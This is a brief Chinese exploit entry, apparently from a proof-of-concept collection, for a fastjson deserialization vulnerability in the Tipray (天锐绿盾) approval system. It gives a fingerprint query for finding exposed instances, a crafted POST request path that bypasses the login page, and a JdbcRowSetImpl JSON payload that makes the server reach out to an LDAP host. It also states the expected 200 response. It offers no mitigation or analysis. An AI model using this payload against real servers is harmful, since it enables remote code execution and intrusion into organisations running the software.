# 天锐绿盾审批系统listfastjson反序列化漏洞

天锐绿盾 ｜ 反序列化 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/.%2e/rest/ext/app/fileopen/record HTTP/1.1`

**Payload**
```
[
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "ldap://192.168.168.11:50389/165c51",
"autoCommit": true
]
```
- **响应特征**：200